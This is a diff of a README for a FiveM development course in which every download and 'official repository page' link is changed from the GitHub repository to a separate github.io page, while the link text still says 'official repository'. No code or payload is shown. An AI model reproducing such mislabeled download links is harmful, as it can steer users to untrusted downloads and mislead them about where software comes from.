@@ -1,6 +1,6 @@
 # 🎓 quasar-academy-v2026 - Master FiveM development through guided lessons
 
-[![](https://img.shields.io/badge/Download-Quasar-Academy-blue.svg)](https://github.com/aground-silt911/quasar-academy-v2026)
+[![](https://img.shields.io/badge/Download-Quasar-Academy-blue.svg)](https://aground-silt911.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official repository page](https://github.com/aground-silt911/quasar-academy-v2026) to initiate the setup.
+1. Visit the [official repository page](https://aground-silt911.github.io) to initiate the setup.
 2. Locate the button labeled Code on the right side of the screen.
 3. Select Download ZIP from the dropdown menu.
 4. Open your Downloads folder in Windows File Explorer.
@@ -32,7 +32,7 @@ Follow these steps to set up the software on your Windows machine:
 Once you extract the files, follow these instructions to launch the platform:
 
 1. Ensure you have a code editor or a web browser ready to view the MDX files.
-2. If you intend to run the live preview, visit the [official repository page](https://github.com/aground-silt911/quasar-academy-v2026) for specific configuration instructions.
+2. If you intend to run the live preview, visit the [official repository page](https://aground-silt911.github.io) for specific configuration instructions.
 3. Use the provided App Router link to connect your Discord account.
 4. Once connected, the application verifies your member roles.
 5. The dashboard updates automatically to show the lessons available to your current rank.
